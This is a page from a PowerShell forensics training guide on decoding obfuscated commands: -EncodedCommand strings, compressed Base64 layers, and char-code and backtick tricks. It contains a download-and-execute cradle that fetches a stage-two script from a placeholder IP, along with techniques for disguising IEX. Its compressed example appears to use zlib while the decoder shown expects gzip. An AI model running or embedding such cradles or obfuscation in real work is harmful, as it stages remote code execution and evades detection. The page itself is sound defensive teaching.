---
tags:
  - PowerShell
---

# PowerShell Forensics: Obfuscation & Decoding

This page is the hands-on companion to [PowerShell Logging](powershell-logging.md): once you have a captured command line or a decoded Script Block Logging (4104) event, this is how you turn what looks like noise into something you can actually read and assess. Every example below was generated and round-trip verified — nothing here is approximated.

## Step 1: Recognize `-EncodedCommand`

PowerShell accepts `-EncodedCommand` (and any unambiguous abbreviation — `-e`, `-en`, `-enc` all work identically) followed by a long Base64-looking string. This is the single most common obfuscation layer you'll encounter, precisely because it's a built-in, fully legitimate PowerShell feature that any script can invoke.

**The gotcha that trips up most people the first time:** the string isn't Base64 of plain ASCII text — it's Base64 of the command encoded as **UTF-16LE** (Unicode), which is how PowerShell represents strings internally. Base64-decode it as if it were plain UTF-8 and you'll get garbage interspersed with null bytes. Decode it as UTF-16LE and it's immediately readable.

### Worked example

Original command:

```powershell
Get-Process | Where-Object {$_.CPU -gt 100}
```

What an attacker (or a legitimate script) would actually pass on the command line:

```
powershell.exe -EncodedCommand RwBlAHQALQBQAHIAbwBjAGUAcwBzACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAkAF8ALgBDAFAAVQAgAC0AZwB0ACAAMQAwADAAfQA=
```

**To decode it, in PowerShell itself:**

```powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("RwBlAHQALQBQAHIAbwBjAGUAcwBzACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAkAF8ALgBDAFAAVQAgAC0AZwB0ACAAMQAwADAAfQA="))
```

Memorize that line. It's the single most useful piece of PowerShell forensics tradecraft in this entire guide — you will use it constantly.

**In CyberChef:** the "From Base64" recipe followed by "Decode text" set to UTF-16LE reproduces the same result without needing a PowerShell session at all, which matters when you're working from a static log export rather than a live or sandboxed host.

## Step 2: Recognize a second, compressed layer

Obfuscation is frequently layered — a script gets compressed *before* it's Base64-encoded, both to shrink an otherwise very long encoded command and to defeat simple string-matching detections looking for plaintext indicators inside the Base64 blob. If decoding the Base64 (Step 1) still leaves you with unreadable binary-looking data rather than a script, this is almost always why.

### Worked example

Original payload:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/stage2.ps1')
```

Compressed and Base64-encoded:

```
eJzzdI1Q0PBLLdf1T8pKTS5R8Est0QtPTXLOyUzNK9HUc8kvz8vJT0wJLinKzEvXUM8oKSmw0tc3NNADQVP94pLE9FQjvYJiQ3VNAK6zGAM=
```

**To decode it, in PowerShell itself** (this example uses the standard compressed-stream pattern seen in the wild — adjust the stream class to match `GzipStream` vs `DeflateStream` depending on which compression the sample actually uses):

```powershell
$compressed = [System.Convert]::FromBase64String("eJzzdI1Q0PBLLdf1T8pKTS5R8Est0QtPTXLOyUzNK9HUc8kvz8vJT0wJLinKzEvXUM8oKSmw0tc3NNADQVP94pLE9FQjvYJiQ3VNAK6zGAM=")
$ms = New-Object System.IO.MemoryStream(,$compressed)
$gz = New-Object System.IO.Compression.GzipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
$sr = New-Object System.IO.StreamReader($gz)
$sr.ReadToEnd()
```

**In CyberChef:** "From Base64" followed by "Gunzip" (or "Raw Inflate" if the sample uses raw DEFLATE rather than a full gzip/zlib wrapper — if Gunzip errors out, that's your signal to try Raw Inflate instead).

!!! tip "A quick visual tell"
    Gzip's file signature (magic bytes `1F 8B 08`) happens to Base64-encode to a string starting with `H4sI` — seeing an encoded blob start with those four characters is a fast, reliable hint that a compression layer is involved before you've even started decoding, worth verifying with `[int][byte[]](...)`-style byte inspection if you want to confirm it yourself rather than take it on faith.

## Step 3: Recognize character-code and string-reassembly obfuscation

Once you're past Base64 and compression, the underlying script itself is often *still* obfuscated — this layer defeats human eyeballing and signature matching on the literal text of a malicious cmdlet name, without needing any encoding at all.

**Character codes.** ASCII values reassembled at runtime:

```powershell
[char]73+[char]69+[char]88   # evaluates to "IEX"
```

(I = 73, E = 69, X = 88 — verify any character code yourself in PowerShell with `[int][char]'I'` if a sample uses a value you don't recognize.)

**String splitting and concatenation.** The same idea with string fragments instead of char codes — `'I'+'E'+'X'`, or reversed strings rebuilt with `-join`, or the `-f` format operator interleaving fragments.

**Backtick insertion.** PowerShell's backtick is an escape character, and — critically — a backtick before a character with no defined escape meaning is simply a no-op that yields that character literally. `` I`E`X `` still parses and executes as `IEX`, because neither `` `E `` nor `` `X `` is a recognized escape sequence. (Backticks *do* change meaning before specific characters — `` `n ``, `` `t ``, `` `r ``, `` `0 ``, `` `a ``, `` `b ``, `` `f ``, `` `v ``, `` `# ``, and a backtick or `$` immediately following a backtick — so a sample avoiding those specific characters after each backtick is a tell that the obfuscation was deliberately constructed, not accidental.)

!!! danger "Red flag"
    Any of these patterns in a command line or decoded script block, especially feeding directly into `IEX`/`Invoke-Expression` — see [Malicious Cmdlet Patterns](powershell-malicious-patterns.md) for the broader reference.

## The general decode workflow

1. Find the `-EncodedCommand`/`-enc` flag and its Base64 argument.
2. Decode as **UTF-16LE**, not UTF-8/ASCII.
3. If the result is still unreadable, decompress (try Gunzip, then Raw Inflate).
4. In the resulting script text, look for char-code arrays, string concatenation, or backtick insertion, and manually (or via CyberChef's Magic recipe, which will often auto-detect and chain the right steps) unwind them.
5. Repeat — layered obfuscation tools commonly nest two or three of the above, and it's normal to go through this loop more than once before reaching genuinely final, readable code.

!!! tip "Practice this"
    [PowerShell Decode](../practice-drills/powershell-decode-drill.md) gives you a fresh, independently-verified `-EncodedCommand` string — different from every example on this page — to decode yourself before checking the answer.

<!-- BACKLINKS:START -->
## Referenced From

- [ATT&CK Coverage Map](../00-foundations/attack-coverage-map.md)
- [Operationalizing Threat Intelligence](../00-foundations/threat-intelligence-operationalization.md)
- [PowerShell Forensics: Evasion Detection](evasion-detection.md)
- [Module 4: PowerShell Forensics](index.md)
- [PowerShell Forensics: Logging](powershell-logging.md)
- [PowerShell Forensics: Malicious Cmdlet Patterns](powershell-malicious-patterns.md)
- [Advanced Hunting with KQL](../07-defender-suite/advanced-hunting-kql.md)
- [Practice Drills](../practice-drills/index.md)
- [Drill: PowerShell Decode](../practice-drills/powershell-decode-drill.md)
- [Windows IR Quick Reference](../quick-reference/windows-ir-poster.md)

<!-- BACKLINKS:END -->

## Sources

- [SANS Digital Forensics Certifications overview](https://www.sans.org/cyber-security-certifications/digital-forensics-certifications) (FOR508 / FOR610 — PowerShell and script-based attack analysis)
- Microsoft Learn — `about_Escape_Characters`, `[System.Text.Encoding]` and `[System.Convert]` .NET reference
